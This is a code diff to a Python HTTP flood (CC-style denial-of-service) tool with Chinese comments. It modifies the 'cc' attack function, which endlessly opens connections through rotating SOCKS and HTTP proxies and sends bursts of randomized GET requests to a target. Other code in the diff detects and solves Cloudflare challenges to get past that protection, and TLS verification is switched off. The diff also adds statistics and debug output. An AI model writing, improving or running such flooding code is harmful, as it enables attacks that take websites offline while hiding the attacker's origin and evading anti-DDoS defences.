@@ -413,9 +413,14 @@ def GenReqHeader(method):
 
 def handle_response_with_cf_detection(s, header_gen_func, header_type="get"):
     """处理响应并检测Cloudflare拦截"""
-    global USE_FLARESOLVERR
+    global USE_FLARESOLVERR, request_count
     
-    if request_count % SAMPLE_RATE == 0:
+    # 先更新请求计数
+    with stats_lock:
+        request_count += 1
+        should_sample = request_count % SAMPLE_RATE == 0
+    
+    if should_sample:
         try:
             s.settimeout(1)
             response = s.recv(1024)
@@ -428,17 +433,31 @@ def handle_response_with_cf_detection(s, header_gen_func, header_type="get"):
                 full_url = f"{protocol}://{target}:{port}{path}"
                 if solve_cloudflare(full_url):
                     print("[CF绕过] Cloudflare挑战已解决")
-                    return header_gen_func(header_type)  # 重新生成header
+                    return header_gen_func(header_type)
                 else:
                     print("[CF绕过] 解决Cloudflare挑战失败")
             
-            update_stats_sample(status_code=status_code)
-        except:
-            update_stats_sample(is_error=True)
-    else:
-        update_stats_sample()
+            # 更新采样统计
+            with stats_lock:
+                if status_code:
+                    success_count += 1
+                    status_codes[status_code] += 1
+                else:
+                    error_count += 1
+                    status_codes['ERROR'] += 1
+                    
+        except Exception as e:
+            with stats_lock:
+                error_count += 1
+                status_codes['ERROR'] += 1
     
-    return None  # 不需要更新header
+    # 检查是否需要打印统计
+    with stats_lock:
+        if request_count % REPORT_INTERVAL == 0:
+            print_stats()
+    
+    return None
+
 
 def ParseUrl(original_url):
 	global target
@@ -488,46 +507,78 @@ def InputOption(question,options,default):
 	return ans
 
 def cc(event,proxy_type):
-	global USE_FLARESOLVERR, url, request_count  # ⚠️ 添加这行
-	header = GenReqHeader("get")
-	proxy = Choice(proxies).strip().split(":")
-	add = "?"
-	if "?" in path:
-		add = "&"
-	event.wait()
-	while True:
-		try:
-			s = socks.socksocket()
-			if proxy_type == 4:
-				s.set_proxy(socks.SOCKS4, str(proxy[0]), int(proxy[1]))
-			if proxy_type == 5:
-				s.set_proxy(socks.SOCKS5, str(proxy[0]), int(proxy[1]))
-			if proxy_type == 0:
-				s.set_proxy(socks.HTTP, str(proxy[0]), int(proxy[1]))
-			if brute:
-				s.setsockopt(socket.IPPROTO_TCP, socket.TCP_NODELAY, 1)
-			s.settimeout(3)
-			s.connect((str(target), int(port)))
-			if protocol == "https":
-				ctx = ssl.SSLContext(ssl.PROTOCOL_TLS_CLIENT)
-				s = ctx.wrap_socket(s,server_hostname=target)
-			try:
-				for _ in range(100):
-					get_host = "GET " + path + add + randomurl() + " HTTP/1.1\r\nHost: " + target + "\r\n"
-					request = get_host + header
-					sent = s.send(str.encode(request))
-					if not sent:
-						proxy = Choice(proxies).strip().split(":")
-						update_stats_sample(is_error=True)
-						break
-					new_header = handle_response_with_cf_detection(s, GenReqHeader, "get")
-					if new_header:
-						header = new_header
-				s.close()
-			except:
-				s.close()
-		except:
-			s.close()
+    global USE_FLARESOLVERR, url, request_count
+    header = GenReqHeader("get")
+    proxy = Choice(proxies).strip().split(":")
+    add = "?"
+    if "?" in path:
+        add = "&"
+    event.wait()
+    
+    connection_attempts = 0
+    successful_requests = 0
+    
+    while True:
+        try:
+            s = socks.socksocket()
+            if proxy_type == 4:
+                s.set_proxy(socks.SOCKS4, str(proxy[0]), int(proxy[1]))
+            elif proxy_type == 5:
+                s.set_proxy(socks.SOCKS5, str(proxy[0]), int(proxy[1]))
+            elif proxy_type == 0:
+                s.set_proxy(socks.HTTP, str(proxy[0]), int(proxy[1]))
+            
+            if brute:
+                s.setsockopt(socket.IPPROTO_TCP, socket.TCP_NODELAY, 1)
+            
+            s.settimeout(10)  # 增加超时时间
+            connection_attempts += 1
+            
+            # 添加连接调试信息
+            if connection_attempts <= 3:
+                print(f"[DEBUG] 尝试连接 {target}:{port} 通过代理 {proxy[0]}:{proxy[1]}")
+            
+            s.connect((str(target), int(port)))
+            
+            if protocol == "https":
+                ctx = ssl.SSLContext(ssl.PROTOCOL_TLS_CLIENT)
+                ctx.check_hostname = False
+                ctx.verify_mode = ssl.CERT_NONE
+                s = ctx.wrap_socket(s, server_hostname=target)
+            
+            if connection_attempts <= 3:
+                print(f"[DEBUG] 连接成功，开始发送请求")
+            
+            try:
+                for i in range(100):
+                    get_host = "GET " + path + add + randomurl() + " HTTP/1.1\r\nHost: " + target + "\r\n"
+                    request = get_host + header
+                    sent = s.send(str.encode(request))
+                    
+                    if not sent:
+                        proxy = Choice(proxies).strip().split(":")
+                        break
+                    
+                    successful_requests += 1
+                    if successful_requests <= 3:
+                        print(f"[DEBUG] 请求 {successful_requests} 发送成功")
+                    
+                    new_header = handle_response_with_cf_detection(s, GenReqHeader, "get")
+                    if new_header:
+                        header = new_header
+                        
+                s.close()
+            except Exception as e:
+                if connection_attempts <= 3:
+                    print(f"[DEBUG] 请求发送错误: {e}")
+                s.close()
+                
+        except Exception as e:
+            if connection_attempts <= 3:
+                print(f"[DEBUG] 连接错误: {e}")
+            s.close()
+            proxy = Choice(proxies).strip().split(":")  # 切换代理
+
 
 
 def head(event,proxy_type):
